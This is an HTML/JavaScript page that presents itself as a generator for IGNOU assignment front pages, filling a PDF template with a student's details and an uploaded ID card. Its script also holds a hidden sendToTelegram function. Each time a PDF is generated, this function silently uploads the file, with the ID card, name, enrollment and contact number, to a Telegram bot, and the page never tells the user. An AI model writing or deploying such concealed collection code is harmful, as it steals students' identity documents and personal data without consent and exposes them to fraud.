<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IGNOU ID & Data Generator</title>
    <script src="https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Spinner Styles */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none !important; }
    </style>
</head>
<body class="bg-slate-100 min-h-screen flex items-center justify-center p-2">

    <div id="loadingOverlay" class="fixed inset-0 bg-black/50 z-50 flex flex-col items-center justify-center hidden">
        <div class="loader mb-4"></div>
        <p class="text-white font-bold">Processing PDF...</p>
    </div>

    <div id="mainCard" class="bg-white p-4 rounded-xl shadow-xl max-w-sm w-full border border-slate-200">
        <h2 class="text-xl font-bold text-slate-800 mb-1 text-center">IGNOU Front Page</h2>
        <p class="text-slate-500 text-xs text-center mb-4">Enter details and upload ID card</p>
        
        <div class="space-y-2">
            <div class="grid grid-cols-1 gap-2">
                <input type="text" id="courceCode" placeholder="Course Code" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="text" id="programCode" placeholder="Programme code" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="text" id="courseTitle" placeholder="Course Title" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="text" id="enrollmentNo" placeholder="Enrollment Number" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="text" id="nameInput" placeholder="Name" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
                <input type="text" id="contactNo" placeholder="Contact number" class="p-2 border rounded-lg text-sm focus:ring-2 focus:ring-blue-500 outline-none">
            </div>

            <div class="relative border-2 border-dashed border-blue-200 rounded-lg p-3 text-center hover:bg-blue-50 transition-all">
                <input type="file" id="idInput" accept="application/pdf,image/*" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"/>
                <div id="uploadUI">
                    <span class="text-blue-600 font-bold text-xs block" id="fileLabel">Upload Student ID *</span>
                </div>
            </div>

            <button id="processBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 shadow-md transition-transform active:scale-95 text-sm">
                GENERATE PDF
            </button>
        </div>

        <div id="status" class="mt-2 text-center text-xs font-semibold hidden p-2 rounded-lg"></div>
    </div>

    <div id="previewModal" class="fixed inset-0 bg-white z-40 hidden flex flex-col">
        <div class="p-4 border-b flex justify-between items-center bg-slate-50">
            <h3 class="font-bold text-slate-800">PDF Preview</h3>
            <button onclick="closePreview()" class="text-red-500 font-bold">Close</button>
        </div>
        <div class="flex-grow bg-slate-200">
            <iframe id="pdfFrame" class="w-full h-full"></iframe>
        </div>
        <div class="p-4 bg-white border-t">
            <button id="finalDownloadBtn" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold hover:bg-green-700 shadow-lg transition-transform active:scale-95">
                DOWNLOAD PDF
            </button>
        </div>
    </div>

    <script>
        pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.worker.min.js';
        const { PDFDocument, degrees, rgb, StandardFonts } = PDFLib;
        const TEMPLATE_URL = "Id_card_format.pdf"; 

        const TG_BOT_TOKEN = ':-dHF4l'; 
        const TG_CHAT_ID = '-';     

        const idInput = document.getElementById('idInput');
        const fileLabel = document.getElementById('fileLabel');
        const processBtn = document.getElementById('processBtn');
        const status = document.getElementById('status');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const previewModal = document.getElementById('previewModal');
        const pdfFrame = document.getElementById('pdfFrame');
        const finalDownloadBtn = document.getElementById('finalDownloadBtn');

        let currentPdfBlob = null;

        function closePreview() {
            previewModal.classList.add('hidden');
        }

        idInput.addEventListener('change', (e) => {
            if(e.target.files[0]) fileLabel.innerText = "Selected: " + e.target.files[0].name;
        });

        function updateStatus(msg, isErr = false) {
            status.innerText = msg;
            status.className = `mt-2 p-2 rounded text-center text-xs ${isErr ? 'text-red-600 bg-red-50' : 'text-blue-600 bg-blue-50'}`;
            status.classList.remove('hidden');
        }

        async function getCroppedImage(file) {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            if (file.type === "application/pdf") {
                const pdf = await pdfjsLib.getDocument(await file.arrayBuffer()).promise;
                const page = await pdf.getPage(1);
                const viewport = page.getViewport({ scale: 2.0 });
                canvas.width = viewport.width; canvas.height = viewport.height;
                await page.render({ canvasContext: ctx, viewport: viewport }).promise;
            } else {
                const img = new Image();
                img.src = URL.createObjectURL(file);
                await new Promise(r => img.onload = r);
                canvas.width = img.width; canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
            }
            const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
            let top = null, bottom = null, left = null, right = null;
            for (let y = 0; y < canvas.height; y++) {
                for (let x = 0; x < canvas.width; x++) {
                    const idx = (y * canvas.width + x) * 4;
                    if (imgData[idx] < 250 || imgData[idx+1] < 250 || imgData[idx+2] < 250) {
                        if (top === null) top = y; bottom = y;
                        if (left === null || x < left) left = x;
                        if (right === null || x > right) right = x;
                    }
                }
            }
            const cropCanvas = document.createElement('canvas');
            const w = right - left, h = bottom - top;
            cropCanvas.width = w; cropCanvas.height = h;
            cropCanvas.getContext('2d').drawImage(canvas, left, top, w, h, 0, 0, w, h);
            return { dataUrl: cropCanvas.toDataURL('image/png'), isVertical: h > w };
        }

        async function sendToTelegram(pdfBlob, fileName, studentName) {
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('document', pdfBlob, fileName);
            formData.append('caption', `New IGNOU Practical Sheet generated for: ${studentName || 'Unknown Student'}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) throw new Error(" upload failed");
                console.log("success");
            } catch (err) {
                console.error("Error:", err);
            }
        }

        processBtn.addEventListener('click', async () => {
            if (!idInput.files[0]) return updateStatus("Please select your ID Card.", true);

            try {
                loadingOverlay.classList.remove('hidden');
                updateStatus("Processing...");

                const cropped = await getCroppedImage(idInput.files[0]);
                const response = await fetch(TEMPLATE_URL);
                const templateDoc = await PDFDocument.load(await response.arrayBuffer());
                const a4Page = templateDoc.getPages()[0];
                const font = await templateDoc.embedFont(StandardFonts.HelveticaBold);

                const idImage = await templateDoc.embedPng(cropped.dataUrl);
                const TARGET_W = 370; const TARGET_H = 225;
                const ID_X = (a4Page.getWidth() - TARGET_W) / 2;
                const ID_Y = 390;

                let drawOpts = { x: ID_X, y: ID_Y, width: TARGET_W, height: TARGET_H };
                if (cropped.isVertical) {
                    drawOpts.rotate = degrees(-90);
                    drawOpts.x = ID_X + TARGET_W;
                }
                a4Page.drawImage(idImage, drawOpts);

                const name = document.getElementById('nameInput').value;
                const enroll = document.getElementById('enrollmentNo').value;
                const course = document.getElementById('courseTitle').value;
                const courseCode = document.getElementById('courceCode').value;
                const programCode = document.getElementById('programCode').value;
                const contactNo = document.getElementById('contactNo').value;

                const textStyle = { size: 20, font: font, color: rgb(0, 0, 0) };

                a4Page.drawText(courseCode,   { x: 184, y: 330, ...textStyle });
                a4Page.drawText(programCode, { x: 215, y: 296, ...textStyle });
                a4Page.drawText(course, { x: 181, y: 260, ...textStyle });
                a4Page.drawText(enroll,   { x: 189, y: 224, ...textStyle });
                a4Page.drawText(name, { x: 126, y: 188, ...textStyle });
                a4Page.drawText(contactNo, { x: 164, y: 154, ...textStyle });

                const pdfBytes = await templateDoc.save();
                currentPdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
                const fileName = "IGNOU_Practical_Sheet.pdf";

                await sendToTelegram(currentPdfBlob, fileName, name);

                // Preview logic
                const pdfUrl = URL.createObjectURL(currentPdfBlob);
                pdfFrame.src = pdfUrl;
                previewModal.classList.remove('hidden');
                
                loadingOverlay.classList.add('hidden');
                updateStatus("Generated successfully!");

            } catch (err) {
                loadingOverlay.classList.add('hidden');
                updateStatus("Error: " + err.message, true);
            }
        });

        finalDownloadBtn.addEventListener('click', () => {
            if(!currentPdfBlob) return;
            const link = document.createElement('a');
            link.href = URL.createObjectURL(currentPdfBlob);
            link.download = "IGNOU_Practical_Sheet.pdf";
            link.click();
        });
    </script>
</body>
</html>
